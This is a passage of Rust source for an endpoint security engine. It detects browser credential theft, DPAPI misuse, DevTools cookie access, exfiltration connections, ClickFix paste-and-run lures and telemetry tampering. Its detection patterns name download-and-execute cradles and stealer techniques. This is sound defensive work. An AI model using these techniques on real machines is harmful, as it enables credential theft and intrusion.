        hit.name = Some(ioc_rule_name(rule).to_string());
        hit.attack = Some(vec![]);
        // the same indicator on the same process alerts once per dedup window
        hit.dedup_key = Some(format!("{rule}:{}", h.id));
        self.state(&info.guid, e.ts).add_evidence(e);
        self.emit(e, hit);
    }

    fn on_process_stop(&mut self, e: &Event) {
        let img = self.table.get(&e.guid).map(|p| p.image.clone());
        self.table.mark_exit(&e.guid, e.ts);
        self.suspends.retain(|w| w.guid != e.guid);
        if let Some(img) = img {
            if is_chromium_image(&img) {
                self.browser_stops.push_back((e.ts, e.pid));
                if self.browser_stops.len() > 512 {
                    self.browser_stops.pop_front();
                }
            }
        }
    }

    fn check_elevation_abuse(&mut self, e: &Event, info: &ProcessInfo) {
        let stops: Vec<TimestampMs> = self
            .browser_stops
            .iter()
            .filter(|(t, _)| *t <= e.ts && e.ts - t <= ST08_WINDOW_MS)
            .map(|s| s.0)
            .collect();
        if stops.len() < ST08_MIN_STOPS {
            return;
        }
        let first = *stops.iter().min().unwrap_or(&e.ts);
        let last = *stops.iter().max().unwrap_or(&e.ts);
        let killer = self
            .kill_intents
            .iter()
            .rev()
            .find(|(t, g)| *t <= e.ts && first - t <= ST08_ATTRIBUTION_MS && !self.is_agent_guid(g))
            .map(|k| k.1.clone());
        let relaunched = self.last_browser_start > last && self.last_browser_start <= e.ts;
        match killer {
            Some(k) => {
                let kp = self
                    .table
                    .get(&k)
                    .cloned()
                    .unwrap_or_else(|| placeholder(&k, 0, e.ts));
                let mut hit = Hit::new(ST08, &k, Severity::High, format!("{} terminated the browser {} times and the browser elevation service started {} ms later — a known way to make the service decrypt cookies for a foreign caller", describe(&kp), stops.len(), e.ts - last));
                hit.actions.push(kill(&kp, false));
                hit.extra_evidence.push(e.clone());
                self.emit(e, hit);
            }
            None if !relaunched => {
                let hit = Hit::new(ST08, &info.guid, Severity::Medium, format!("The browser was terminated {} times and the browser elevation service started {} ms later without the browser being relaunched; the caller could not be identified", stops.len(), e.ts - last));
                self.state(&info.guid, e.ts).add_evidence(e);
                self.emit(e, hit);
            }
            None => {}
        }
    }

    fn check_paste_and_run(
        &mut self,
        e: &Event,
        info: &ProcessInfo,
        parent: Option<&ProcessInfo>,
        name: &str,
        cmd_lower: &str,
    ) {
        let Some(parent) = parent else { return };
        let pn = file_name_lower(&parent.image);
        let grand = self.table.parent_of(parent).cloned();
        let gpn = grand
            .as_ref()
            .map(|g| file_name_lower(&g.image))
            .unwrap_or_default();
        let is_terminal =
            |n: &str| matches!(n, "windowsterminal.exe" | "wt.exe" | "openconsole.exe");
        let interactive_shell =
            CLICKFIX_SHELLS.contains(&pn.as_str()) && (gpn == "explorer.exe" || is_terminal(&gpn));
        let launcher =
            pn == "explorer.exe" || is_terminal(&pn) || is_browser_image(&pn) || interactive_shell;

        // nslookup staging: nslookup against a hard-coded external resolver from cmd/powershell
        if name == "nslookup.exe" && CLICKFIX_SHELLS.contains(&pn.as_str()) {
            let resolver = ipv4_tokens(cmd_lower)
                .into_iter()
                .find(|ip| is_external_ip(ip));
            let staged = parent.cmdline.to_ascii_lowercase().contains("nslookup")
                || gpn == "explorer.exe"
                || is_terminal(&gpn);
            if let (Some(ip), true) = (resolver, staged) {
                let mut hit = Hit::new(ST11, &info.guid, Severity::High, format!("{} ran nslookup against the hard-coded external DNS server {ip} — DNS-staged ClickFix delivers the next stage in the answer", short_name(parent)));
                // Only the nslookup child: the parent may be the user's own
                // interactive shell (an admin typing `nslookup host 8.8.8.8`).
                hit.actions.push(kill(info, false));
                self.state(&info.guid, e.ts).add_evidence(e);
                self.emit(e, hit);
                return;
            }
        }
        if !launcher || !(CLICKFIX_SHELLS.contains(&name) || CLICKFIX_LOLBINS.contains(&name)) {
            return;
        }
        let Some(mut reason) = clickfix_reason(cmd_lower, name) else {
            return;
        };
        if is_browser_image(&pn) && !cmd_lower.contains('#') {
            // FileFix from a browser upload dialog needs the comment trick; else require encoded/hidden cradle
            if !(has_encoded_command(cmd_lower)
                || (has_hidden_window(cmd_lower) && reason.contains("download")))
            {
                return;
            }
        }
        if is_browser_image(&pn) && cmd_lower.contains('#') {
            reason = "a FileFix comment trick";
        }
        let via = if interactive_shell {
            format!("{} (in {})", short_name(parent), gpn)
        } else {
            short_name(parent)
        };
        let mut hit = Hit::new(ST11, &info.guid, Severity::High, format!("{via} started {} with {reason}: \"{}\" — the pattern of a ClickFix/FileFix paste-and-run lure", short_name(info), truncate(&info.cmdline, 160)));
        hit.actions.push(kill(info, true));
        self.state(&info.guid, e.ts).add_evidence(e);
        self.emit(e, hit);
    }

    // ------------------------------------------------------------------
    // files (ST-01, ST-02, ST-16)
    // ------------------------------------------------------------------

    fn on_file(&mut self, e: &Event, path: &str, op: FileOp) {
        if !may_be_sensitive(path) {
            return;
        }
        let norm = normalize_path(path);
        let dl = strip_drive(&norm).to_string();
        if self.check_canary(e, &dl, op) {
            return;
        }
        let Some(store) = match_normalized(&norm) else {
            return;
        };
        let relevant = match op {
            FileOp::Open | FileOp::Read => true,
            FileOp::Write | FileOp::Create => {
                store.owner == crate::paths::OwnerApp::Discord
                    && store.noun.starts_with("client core")
            }
            FileOp::Rename | FileOp::Delete => false,
        };
        if !relevant || self.is_agent_guid(&e.guid) || e.pid == 4 || e.pid == 0 {
            return;
        }
        let proc_ = self.proc_info(e);
        if is_trusted_owner(&proc_, &store)
            || benign_reader_for(&proc_, &store, &norm).is_some()
            || Self::system_trusted(&proc_)
        {
            return;
        }
        if self.excluded(&proc_, ST01, e.ts) || self.iocs.allowed_process(&proc_) {
            return;
        }
        self.on_sensitive_read(e, &proc_, &store, op);
    }

    fn on_sensitive_read(
        &mut self,
        e: &Event,
        proc_: &ProcessInfo,
        store: &SensitiveStore,
        op: FileOp,
    ) {
        let st = self.state(&proc_.guid, e.ts);
        st.add_category(store.category, e.ts);
        st.touch(store.app, store.noun);
        st.add_evidence(e);
        if st.first_cred_ts.is_none() {
            st.first_cred_ts = Some(e.ts);
        }
        st.last_cred_ts = Some(e.ts);
        let ncat = st.categories_within(e.ts, ST02_WINDOW_MS);
        let first = st.first_cred_ts.unwrap_or(e.ts);
        let phrase = stores_phrase(&st.touched);

        let untrusted = is_untrusted_location_or_signature(proc_);
        let kill_at_expiry = untrusted_sig(proc_.signed) && proc_.path_class.is_user_writable();
        let verb = if op == FileOp::Write || op == FileOp::Create {
            "modified"
        } else {
            "read"
        };
        let mut hit = Hit::new(
            ST01,
            &proc_.guid,
            if untrusted {
                Severity::High
            } else {
                Severity::Medium
            },
            format!(
                "{} {verb} {} {}, a store only {} itself should open",
                describe(proc_),
                store.app,
                store.noun,
                store.app
            ),
        );
        hit.suspend = true;
        hit.kill_at_expiry = kill_at_expiry;
        self.emit(e, hit);

        if ncat >= ST02_MIN_CATEGORIES {
            let mut hit = Hit::new(
                ST02,
                &proc_.guid,
                Severity::Critical,
                format!(
                    "{} collected {} — {ncat} kinds of secrets within {}",
                    describe(proc_),
                    phrase,
                    fmt_secs(e.ts - first)
                ),
            );
            hit.actions.push(kill(proc_, true));
            if proc_.path_class.is_user_writable() && !proc_.image.is_empty() {
                hit.actions.push(ResponseAction::BlockImageNetwork {
                    image: proc_.image.clone(),
                    ttl_secs: None,
                });
                hit.actions.push(quarantine(proc_));
            }
            self.emit(e, hit);
        }
    }

    fn check_canary(&mut self, e: &Event, dl: &str, op: FileOp) -> bool {
        let (armed_hit, conditional_hit) = match self.canaries.lock() {
            Ok(c) => (
                c.armed.iter().any(|a| {
                    dl == a
                        || (dl.starts_with(a.as_str())
                            && dl.as_bytes().get(a.len()) == Some(&b'\\'))
                }),
                c.conditional.iter().any(|a| dl == a),
            ),
            Err(_) => (false, false),
        };
        let writes = matches!(op, FileOp::Write | FileOp::Create);
        if conditional_hit && writes && self.is_agent_guid(&e.guid) {
            self.arm_canary(dl);
            return true;
        }
        if !armed_hit {
            return false;
        }
        if self.is_agent_guid(&e.guid) || e.pid == 0 || e.pid == 4 {
            return true;
        }
        let proc_ = self.proc_info(e);
        if is_canary_ignored_reader(&proc_) {
            return true;
        }
        // A real program writing a conditional decoy path (e.g. `aws configure`) replaced the decoy.
        let is_conditional_path = is_conditional_canary(dl);
        if is_conditional_path && writes {
            self.disarm_canary(dl);
            return false;
        }
        let store = match_normalized(dl);
        let owner_read = store.as_ref().is_some_and(|s| is_trusted_owner(&proc_, s));
        let what = store
            .as_ref()
            .map(|s| format!("{} {}", s.app, s.noun))
            .unwrap_or_else(|| "credential store".into());
        let mut hit = Hit::new(
            ST16,
            &proc_.guid,
            if owner_read {
                Severity::High
            } else {
                Severity::Critical
            },
            format!(
                "{} opened a decoy {what} planted by Kestrel — no legitimate program reads it",
                describe(&proc_)
            ),
        );
        if owner_read {
            // The legitimate owner touching the decoy suggests a profile-name collision or
            // code injected into the browser; alert without killing the user's browser.
            hit.summary
                .push_str(" (reader is the store's own application: check for injection into it)");
            hit.strong = false;
        } else {
            // Protect: stop the reader and cut its network; isolate the whole
            // host only for an untrusted (unsigned / invalid / unknown)
            // image running from a user-writable location (M11).
            hit.actions.push(kill(&proc_, true));
            if !proc_.image.is_empty() {
                hit.actions.push(ResponseAction::BlockImageNetwork {
                    image: proc_.image.clone(),
                    ttl_secs: Some(BLOCK_TTL_SECS),
                });
            }
            hit.actions.push(quarantine(&proc_));
            if untrusted_sig(proc_.signed) && proc_.path_class.is_user_writable() {
                hit.actions.push(ResponseAction::IsolateHost {
                    allow_ips: self.host.server_ips.clone(),
                });
            }
        }
        if let Some(s) = &store {
            let st = self.state(&proc_.guid, e.ts);
            st.touch(s.app, "decoy");
        }
        self.state(&proc_.guid, e.ts).add_evidence(e);
        self.emit(e, hit);
        true
    }

    // ------------------------------------------------------------------
    // DPAPI (ST-03)
    // ------------------------------------------------------------------

    fn on_dpapi(&mut self, e: &Event, description: &str) {
        let Some(browser) = dpapi_browser(description) else {
            return;
        };
        if self.is_agent_guid(&e.guid) || e.pid == 0 || e.pid == 4 {
            return;
        }
        let proc_ = self.proc_info(e);
        let name = file_name_lower(&proc_.image);
        let trusted = !is_untrusted_location_or_signature(&proc_);
        if trusted && (is_browser_image(&name) || name == "elevation_service.exe") {
            return;
        }
        let pseudo = SensitiveStore {
            category: DataCategory::BrowserMasterKey,
            owner: crate::paths::OwnerApp::Chromium,
            app: browser,
            noun: "DPAPI-protected secrets",
            owners: &[],
        };
        if benign_reader_for(&proc_, &pseudo, "").is_some()
            || self.excluded(&proc_, ST03, e.ts)
            || self.iocs.allowed_process(&proc_)
        {
            return;
        }
        let st = self.state(&proc_.guid, e.ts);
        st.add_category(DataCategory::BrowserMasterKey, e.ts);
        st.touch(browser, "DPAPI-protected secrets");
        st.add_evidence(e);
        st.last_dpapi_ts = Some(e.ts);
        if st.first_cred_ts.is_none() {
            st.first_cred_ts = Some(e.ts);
        }
        let ncat = st.categories_within(e.ts, ST02_WINDOW_MS);
        let first = st.first_cred_ts.unwrap_or(e.ts);
        let phrase = stores_phrase(&st.touched);
        let kill_at_expiry = untrusted_sig(proc_.signed) && proc_.path_class.is_user_writable();
        let mut hit = Hit::new(ST03, &proc_.guid, Severity::High, format!("{} used Windows DPAPI to decrypt {browser} secrets (\"{}\") — only the browser itself should do this", describe(&proc_), truncate(description, 40)));
        hit.suspend = true;
        hit.kill_at_expiry = kill_at_expiry;
        self.emit(e, hit);
        if ncat >= ST02_MIN_CATEGORIES {
            let mut hit = Hit::new(
                ST02,
                &proc_.guid,
                Severity::Critical,
                format!(
                    "{} collected {} — {ncat} kinds of secrets within {}",
                    describe(&proc_),
                    phrase,
                    fmt_secs(e.ts - first)
                ),
            );
            hit.actions.push(kill(&proc_, true));
            if proc_.path_class.is_user_writable() {
                hit.actions.push(ResponseAction::BlockImageNetwork {
                    image: proc_.image.clone(),
                    ttl_secs: None,
                });
                hit.actions.push(quarantine(&proc_));
            }
            self.emit(e, hit);
        }
    }

    // ------------------------------------------------------------------
    // network (ST-04, ST-06, ST-13, ST-14, IOC-NET)
    // ------------------------------------------------------------------

    fn domain_owner_ok(&self, p: &ProcessInfo, host: &str) -> bool {
        let name = file_name_lower(&p.image);
        !is_untrusted_location_or_signature(p)
            && DOMAIN_OWNERS
                .iter()
                .any(|(d, imgs)| host_matches(host, d) && imgs.contains(&name.as_str()))
    }

    fn exfil_match(&self, host: &str) -> Option<String> {
        let h = host.trim_end_matches('.').to_ascii_lowercase();
        self.exfil_hosts
            .iter()
            .find(|x| host_matches(&h, x))
            .cloned()
    }

    /// Destination block for an IOC hit: per offending image unless the
    /// policy asks for host-wide blocks, always with a TTL, tagged with the
    /// IOC id so the agent can lift it when the IOC is deleted (M10).
    fn ioc_block(&self, ip: &str, p: &ProcessInfo, ioc_id: &str) -> ResponseAction {
        let per_image = !self.policy.ioc_block_host_wide && !p.image.is_empty();
        ResponseAction::BlockDestination {
            ip: ip.to_string(),
            port: None,
            image: per_image.then(|| p.image.clone()),
            ttl_secs: Some(self.policy.ioc_block_ttl_secs.max(60)),
            ioc_id: Some(ioc_id.to_string()).filter(|s| !s.is_empty()),
        }
    }

    fn st14_actions(p: &ProcessInfo, ips: &[String], port: Option<u16>) -> Vec<ResponseAction> {
        if p.path_class.is_user_writable() && !p.image.is_empty() {
            vec![ResponseAction::BlockImageNetwork {
                image: p.image.clone(),
                ttl_secs: None,
            }]
        } else {
            ips.iter()
                .map(|ip| ResponseAction::BlockDestination {
                    ip: ip.clone(),
                    port,
                    image: Some(p.image.clone()).filter(|s| !s.is_empty()),
                    ttl_secs: Some(BLOCK_TTL_SECS),
                    ioc_id: None,
                })
                .collect()
        }
    }

    fn on_net(&mut self, e: &Event, dst_ip: &str, dst_port: u16, dst_host: Option<&str>) {
        if self.is_agent_guid(&e.guid) || e.pid == 0 || e.pid == 4 {
            return;
        }
        let ip_norm = parse_ip(dst_ip)
            .map(|i| i.to_string())
            .unwrap_or_else(|| dst_ip.to_string());
        if self.server_ips.contains(&ip_norm) {
            return;
        }
        let proc_ = self.proc_info(e);
        let host: Option<String> = dst_host.map(|h| h.to_ascii_lowercase()).or_else(|| {
            self.states
                .get(&e.guid)
                .and_then(|s| s.dns.get(&ip_norm).cloned())
        });
        let browser = is_browser_image(&proc_.image) && !is_untrusted_location_or_signature(&proc_);

        // IOCs
        let ioc = self.iocs.by_ip(dst_ip).cloned().or_else(|| {
            host.as_deref()
                .and_then(|h| self.iocs.by_domain(h).cloned())
        });
        if let Some(h) = ioc {
            if h.action == IocAction::Allow {
                return;
            }
            let mut actions = vec![self.ioc_block(&ip_norm, &proc_, &h.id)];
            if !browser {
                actions.push(kill(&proc_, true));
            }
            let dest = host
                .as_ref()
                .map(|h| format!("{ip_norm} ({h})"))
                .unwrap_or_else(|| ip_norm.clone());
            self.emit_ioc(
                e,
                &proc_,
                IOC_NET,
                &h,
                format!(
                    "{} connected to known-bad destination {dest}:{dst_port}",
                    describe(&proc_)
                ),
                actions,
            );
        }

        let external = is_external_ip(dst_ip);
        // ST-06 local CDP client
        if is_loopback_ip(dst_ip)
            && !browser
            && ((9222..=9229).contains(&dst_port) || self.debug_ports.contains_key(&dst_port))
        {
            let mut hit = Hit::new(ST06, &proc_.guid, Severity::High, format!("{} connected to the browser's DevTools debugging port {dst_port} on this machine — it can read every cookie through it", describe(&proc_)));
            hit.actions.push(kill(&proc_, false));
            self.state(&proc_.guid, e.ts).add_evidence(e);
            self.emit(e, hit);
        }

        // ST-14 dead drop / exfil service
        if !browser {
            let by_host = host.as_deref().and_then(|h| {
                self.exfil_match(h)
                    .filter(|_| !self.domain_owner_ok(&proc_, h))
                    .map(|x| (h.to_string(), x))
            });
            let rpc = dst_port == 8545 && external;
            if by_host.is_some() || rpc {
                let what = match &by_host {
                    Some((h, _)) => format!("{h} ({ip_norm}:{dst_port})"),
                    None => format!(
                        "{ip_norm}:8545, a blockchain RPC port used for EtherHiding C2 lookups"
                    ),
                };
                let mut hit = Hit::new(
                    ST14,
                    &proc_.guid,
                    Severity::High,
                    format!(
                        "{} connected to {what} — a dead-drop / exfiltration service stealers use",
                        describe(&proc_)
                    ),
                );
                hit.actions = Self::st14_actions(&proc_, std::slice::from_ref(&ip_norm), None);
                self.state(&proc_.guid, e.ts).add_evidence(e);
                self.emit(e, hit);
            }
        }

        if !external {
            return;
        }
        // ST-13 .NET LOLBin making external connections
        if let Some(reason) = self.states.get(&e.guid).and_then(|s| s.st13) {
            let mut hit = Hit::new(ST13, &proc_.guid, Severity::High, format!("{} started {reason} and then connected to {ip_norm}:{dst_port} — typical of a stealer hollowed into a .NET Framework binary", describe(&proc_)));
            hit.actions.push(kill(&proc_, true));
            self.state(&proc_.guid, e.ts).add_evidence(e);
            self.emit(e, hit);
        }

        // ST-04 steal-then-send (same process, or its parent/children when one of them read the secrets)
        if browser {
            return;
        }
        let mut readers: Vec<ProcessGuid> = vec![proc_.guid.clone()];
        // Relatives only when the connecting process is itself untrusted-ish: a trusted
        // Windows binary (explorer, svchost) connecting out says nothing about its children.
        if !Self::system_trusted(&proc_) && !self.protected(&proc_) {
            if let Some(p) = self.table.parent_of(&proc_) {
                if !Self::system_trusted(p) && !is_browser_image(&p.image) {
                    readers.push(p.guid.clone());
                }
            }
            for c in self.table.children_of(&proc_.guid) {
                readers.push(c.guid.clone());
            }
        }
        let reader = readers.into_iter().find_map(|g| {
            let t = self.states.get(&g)?.cred_ts()?;
            (t <= e.ts && e.ts - t <= ST04_WINDOW_MS).then_some(g)
        });
        let Some(rg) = reader else { return };
        let rp = self.table.get(&rg).cloned().unwrap_or_else(|| {
            if rg == proc_.guid {
                proc_.clone()
            } else {
                placeholder(&rg, 0, e.ts)
            }
        });
        let (phrase, delay) = {
            let st = self.state(&rg, e.ts);
            (
                stores_phrase(&st.touched),
                fmt_secs(e.ts - st.cred_ts().unwrap_or(e.ts)),
            )
        };
        let dest = match &host {
            Some(h) => format!("{ip_norm}:{dst_port} ({h})"),
            None => format!("{ip_norm}:{dst_port}"),
        };
        let who = if rg == proc_.guid {
            "then connected to".to_string()
        } else if proc_.parent_guid.as_ref() == Some(&rg)
            || self.table.parent_of(&proc_).is_some_and(|p| p.guid == rg)
        {
            format!("then its child {} connected to", short_name(&proc_))
        } else {
            format!("then its parent {} connected to", short_name(&proc_))
        };
        let mut hit = Hit::new(
            ST04,
            &rg,
            Severity::Critical,
            format!(
                "{} read {phrase}, {who} {dest} {delay} later",
                describe(&rp)
            ),
        );
        hit.actions.push(kill(&rp, true));
        if rg != proc_.guid {
            hit.actions.push(kill(&proc_, true));
            if proc_.path_class.is_user_writable() {
                hit.actions.push(quarantine(&proc_));
            }
        }
        hit.actions.push(ResponseAction::BlockDestination {
            ip: ip_norm.clone(),
            port: None,
            image: None,
            ttl_secs: Some(BLOCK_TTL_SECS),
            ioc_id: None,
        });
        hit.actions.push(quarantine(&rp));
        hit.escalation_ip = Some((ip_norm, dst_port));
        hit.process = Some(rp);
        if rg != proc_.guid {
            hit.extra_evidence.push(e.clone());
        } else {
            self.state(&rg, e.ts).add_evidence(e);
        }
        self.emit(e, hit);
    }

    fn on_dns(&mut self, e: &Event, qname: &str, answers: &[String]) {
        if self.is_agent_guid(&e.guid) || e.pid == 0 || e.pid == 4 {
            return;
        }
        let q = qname.trim_end_matches('.').to_ascii_lowercase();
        let ips: Vec<String> = answers
            .iter()
            .filter_map(|a| parse_ip(a))
            .map(|i| i.to_string())
            .collect();
        {
            let st = self.state(&e.guid, e.ts);
            for ip in &ips {
                if st.dns.len() >= MAX_DNS_PER_PROC && !st.dns.contains_key(ip) {
                    if let Some(k) = st.dns.keys().next().cloned() {
                        st.dns.remove(&k);
                    }
                }
                st.dns.insert(ip.clone(), q.clone());
            }
        }
        let proc_ = self.proc_info(e);
        let browser = is_browser_image(&proc_.image) && !is_untrusted_location_or_signature(&proc_);
        if let Some(h) = self.iocs.by_domain(&q).cloned() {
            if h.action == IocAction::Allow {
                return;
            }
            let mut actions: Vec<ResponseAction> = ips
                .iter()
                .map(|ip| self.ioc_block(ip, &proc_, &h.id))
                .collect();
            if !browser {
                actions.push(kill(&proc_, true));
            }
            self.emit_ioc(
                e,
                &proc_,
                IOC_DNS,
                &h,
                format!("{} looked up known-bad domain {q}", describe(&proc_)),
                actions,
            );
        }
        if browser {
            return;
        }
        if self.exfil_match(&q).is_some() && !self.domain_owner_ok(&proc_, &q) {
            let mut hit = Hit::new(ST14, &proc_.guid, Severity::High, format!("{} looked up {q} — a dead-drop / exfiltration service stealers use for C2 and uploads", describe(&proc_)));
            hit.actions = Self::st14_actions(&proc_, &ips, None);
            self.state(&proc_.guid, e.ts).add_evidence(e);
            self.emit(e, hit);
        }
    }

    // ------------------------------------------------------------------
    // cross-process access (ST-07, ST-08 attribution)
    // ------------------------------------------------------------------

    fn on_target(&mut self, e: &Event, t: &TargetProcess) {
        if !is_browser_image(&t.target_image)
            || self.is_agent_guid(&e.guid)
            || e.pid == 0
            || e.pid == 4
        {
            return;
        }
        let src = self.proc_info(e);
        if is_browser_image(&src.image) && !is_untrusted_location_or_signature(&src) {
            return; // browser broker / children
        }
        if let EventData::ProcessAccess(_) = &e.data {
            if t.granted_access & 0x1 != 0 && !self.protected(&src) {
                self.kill_intents.push_back((e.ts, src.guid.clone()));
                if self.kill_intents.len() > 256 {
                    self.kill_intents.pop_front();
                }
            }
        }
        if !Self::untrusted_actor(&src) || Self::is_benign_av(&src) {
            return;
        }
        let tname = crate::paths::file_name(&t.target_image).to_string();
        let what = match &e.data {
            EventData::ProcessAccess(_) => {
                if t.granted_access & (0x2 | 0x10 | 0x20) == 0 {
                    return;
                }
                format!("opened {tname} (pid {}) with memory {}", t.target_pid, access_rights(t.granted_access))
            }
            EventData::RemoteThread(_) => format!("injected a thread into {tname} (pid {})", t.target_pid),
            EventData::ThreadContext(_) => format!("changed a thread context in {tname} (pid {}) — hardware-breakpoint key capture", t.target_pid),
            EventData::DebugAttach(_) => format!("attached a debugger to {tname} (pid {}) — the VoidStealer way to capture the App-Bound key", t.target_pid),
            _ => return,
        };
        let mut hit = Hit::new(
            ST07,
            &src.guid,
            Severity::Critical,
            format!("{} {what}", describe(&src)),
        );
        hit.actions.push(kill(&src, true));
        hit.actions.push(quarantine(&src));
        self.state(&src.guid, e.ts).add_evidence(e);
        self.emit(e, hit);
    }

    // ------------------------------------------------------------------
    // image loads (ST-08b, ST-09, ST-15)
    // ------------------------------------------------------------------

    fn on_image_load(
        &mut self,
        e: &Event,
        path: &str,
        _signer: Option<&str>,
        signed: SignatureState,
    ) {
        let dll = file_name_lower(path);
        let is_nss = dll == "nss3.dll";
        let is_sideload = SIDELOAD_DLLS.contains(&dll.as_str());
        let bad_sig = matches!(signed, SignatureState::Unsigned | SignatureState::Invalid);
        if !is_nss && !is_sideload && !bad_sig {
            return;
        }
        if self.is_agent_guid(&e.guid) || e.pid == 0 || e.pid == 4 {
            return;
        }
        let proc_ = self.proc_info(e);
        let pname = file_name_lower(&proc_.image);
        let dll_dl = driveless(path);

        if is_nss && !is_mozilla_image(&proc_.image) && !NSS_BUNDLERS.contains(&pname.as_str()) {
            let same_dir = !proc_.image.is_empty()
                && dll_dl.rsplit_once('\\').map(|d| d.0)
                    == driveless(&proc_.image).rsplit_once('\\').map(|d| d.0);
            if !same_dir || is_untrusted_location_or_signature(&proc_) {
                let hit = Hit::new(ST09, &proc_.guid, Severity::Medium, format!("{} loaded Firefox's crypto library nss3.dll from {} — used to decrypt saved Firefox passwords", describe(&proc_), truncate(path, 120)));
                self.state(&proc_.guid, e.ts).add_evidence(e);
                self.emit(e, hit);
            }
        }

        if is_sideload && SIDELOAD_HOSTS.contains(&pname.as_str()) && !proc_.image.is_empty() {
            let pdl = driveless(&proc_.image);
            let host_legit = SIDELOAD_LEGIT_DIRS.iter().any(|d| pdl.contains(d));
            let dll_legit = SIDELOAD_LEGIT_DIRS.iter().any(|d| dll_dl.contains(d));
            if !host_legit && !dll_legit {
                let mut hit = Hit::new(ST15, &proc_.guid, Severity::High, format!("{} — a Microsoft component running outside its install folder — loaded {} from {} (DLL side-loading)", describe(&proc_), crate::paths::file_name(path), truncate(path, 120)));
                hit.actions.push(kill(&proc_, true));
                hit.actions.push(ResponseAction::QuarantineFile {
                    path: path.to_string(),
                    sha256: None,
                });
                hit.actions.push(quarantine(&proc_));
                self.state(&proc_.guid, e.ts).add_evidence(e);
                self.emit(e, hit);
            }
        }

        if bad_sig && BROWSER_APP_DIRS.iter().any(|d| dll_dl.contains(d)) {
            let mut hit = Hit::new(ST08, &proc_.guid, Severity::High, format!("{} loaded unsigned {} from the browser's Application folder — code there can ask the elevation service to decrypt cookies", describe(&proc_), crate::paths::file_name(path)));
            if !is_browser_image(&proc_.image) {
                hit.actions.push(kill(&proc_, false));
            }
            hit.actions.push(ResponseAction::QuarantineFile {
                path: path.to_string(),
                sha256: None,
            });
            self.state(&proc_.guid, e.ts).add_evidence(e);
            self.emit(e, hit);
        }
    }

    // ------------------------------------------------------------------
    // registry (ST-10, TP-01/03/04)
    // ------------------------------------------------------------------

    fn on_registry(&mut self, e: &Event, key: &str, value_name: &str, data: Option<&str>) {
        let k = key.to_ascii_lowercase();
        let vn = value_name.to_ascii_lowercase();
        let d = data.unwrap_or("").to_ascii_lowercase();
        if self.is_agent_guid(&e.guid) {
            return;
        }
        // ST-10 ClickFix RunMRU / TypedPaths
        let runmru = k.contains(r"\explorer\runmru");
        let typed = k.contains(r"\explorer\typedpaths");
        if (runmru || typed) && vn != "mrulist" {
            if let Some(bin) = runmru_lolbin(&d) {
                self.on_clickfix_artifact(e, bin, runmru, data.unwrap_or(""));
            }
        }
        // Tamper via registry
        let tp = if k.contains(r"\control\wmi\autologger\")
            && matches!(vn.as_str(), "start" | "enabled" | "enableproperty")
            && crate::util::reg_number(&d) == Some(0)
        {
            Some((TP01, "disabled an ETW AutoLogger session or provider"))
        } else if (k.contains(r"\software\microsoft\amsi")
            && (vn == "featurebits" || k.contains(r"\providers")))
            || k.contains(r"\microsoft\amsi\providers\")
        {
            Some((TP03, "changed the AMSI configuration"))
        } else if k.contains(r"\currentcontrolset\services\kestrel") {
            Some((TP04, "modified the Kestrel service configuration"))
        } else {
            None
        };
        if let Some((rule, what)) = tp {
            let proc_ = self.proc_info(e);
            let hit = Hit::new(
                rule,
                &proc_.guid,
                Severity::Critical,
                format!(
                    "{} {what} ({}\\{value_name} = {})",
                    describe(&proc_),
                    truncate(key, 100),
                    truncate(data.unwrap_or(""), 40)
                ),
            );
            self.state(&proc_.guid, e.ts).add_evidence(e);
            self.emit(e, hit);
        }
    }

    fn on_clickfix_artifact(&mut self, e: &Event, bin: &'static str, runmru: bool, raw: &str) {
        let writer = self.proc_info(e);
        let protect = self.mode(ST10) == RuleMode::Protect;
        let children: Vec<ProcessInfo> = self
            .table
            .children_of(&writer.guid)
            .into_iter()
            .filter(|c| {
                c.exit_ts.is_none()
                    && (e.ts - c.start_ts).abs() <= CLICKFIX_WINDOW_MS
                    && file_name_lower(&c.image).starts_with(bin)
            })
            .cloned()
            .collect();
        let surface = if runmru {
            "the Run dialog (RunMRU)"
        } else {
            "the Explorer address bar (TypedPaths)"
        };
        let cmd = truncate(raw.trim_end_matches("\\1"), 160);
        let subject = children.first().cloned().unwrap_or_else(|| writer.clone());
        let mut hit = Hit::new(ST10, &subject.guid, Severity::High, format!("A command was pasted into {surface} and run: \"{cmd}\" — the hallmark of a ClickFix fake-CAPTCHA lure"));
        hit.process = Some(subject);
        for c in &children {
            hit.actions.push(kill(c, true));
        }
        hit.extra_evidence.push(e.clone());
        if protect && self.clickfix.len() < 64 {
            self.clickfix.push(ClickfixPending {
                writer: writer.guid.clone(),
                until: e.ts + CLICKFIX_WINDOW_MS,
                lolbin: bin,
                protect,
            });
        }
        self.emit(e, hit);
    }

    // ------------------------------------------------------------------
    // script blocks (ST-11 script variant, IOC-URL)
    // ------------------------------------------------------------------

    fn on_script(&mut self, e: &Event, content: &str) {
        if self.is_agent_guid(&e.guid) {
            return;
        }
        let c = content.to_ascii_lowercase();
        let proc_ = self.proc_info(e);
        if let Some(h) = self.iocs.by_url_in(&c).cloned() {
            self.emit_ioc(
                e,
                &proc_,
                IOC_URL,
                &h,
                format!(
                    "{} ran a script containing the known-bad URL {}",
                    describe(&proc_),
                    h.value
                ),
                vec![kill(&proc_, true)],
            );
        }
        let exec =
            contains_word(&c, "iex") || c.contains("invoke-expression") || c.contains("| . (");
        let fetch = ["irm", "iwr", "curl", "wget"]
            .iter()
            .any(|w| contains_word(&c, w))
            || [
                "downloadstring",
                "downloaddata",
                "invoke-restmethod",
                "invoke-webrequest",
                "net.webclient",
                "frombase64string",
            ]
            .iter()
            .any(|w| c.contains(w));
        if !(exec && fetch) {
            return;
        }
        let Some(parent) = self.table.parent_of(&proc_).cloned() else {
            return;
        };
        let pn = file_name_lower(&parent.image);
        if !(pn == "explorer.exe"
            || matches!(
                pn.as_str(),
                "windowsterminal.exe" | "wt.exe" | "openconsole.exe"
            )
            || is_browser_image(&pn))
        {
            return;
        }
        let mut hit = Hit::new(ST11, &proc_.guid, Severity::High, format!("{} (started by {pn}) ran a download-and-execute script: \"{}\" — the pattern of a pasted ClickFix command", short_name(&proc_), truncate(content.trim(), 160)));
        hit.actions.push(kill(&proc_, true));
        self.state(&proc_.guid, e.ts).add_evidence(e);
        self.emit(e, hit);
    }

    // ------------------------------------------------------------------
    // tamper (TP-01…TP-05)
    // ------------------------------------------------------------------

    fn on_tamper(&mut self, e: &Event, kind: TamperKind, detail: &str) {
        let (rule, sev, what) = match kind {
            TamperKind::EtwSessionStopped => (
                TP01,
                Severity::Critical,
                "an ETW telemetry session was stopped",
            ),
            TamperKind::EtwProviderDisabled => {
                (TP01, Severity::Critical, "an ETW provider was disabled")
            }
